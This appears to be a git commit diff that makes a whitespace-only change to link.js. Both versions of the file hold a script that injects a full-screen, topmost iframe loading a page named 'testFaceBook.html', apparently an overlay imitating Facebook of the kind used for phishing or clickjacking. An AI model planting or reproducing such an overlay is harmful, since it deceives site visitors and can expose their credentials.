67c10c32ff41f26c98be1bc7e6836525a551909d
LZK-test <117658985+LZK-test@users.noreply.github.com>
2022-11-08 11:46:42 +0800

    Update link.js

--- link.js
+++ link.js
@@ -1,1 +1,1 @@
-document.write('<iframe src="https://lzk-test.github.io/testFaceBook.html" style="position:fixed; top:0; left:0;width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>')
+document.write('<iframe src="https://lzk-test.github.io/testFaceBook.html" style="position:fixed; top:0; left:0;width:100%; height:100%;  border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>')
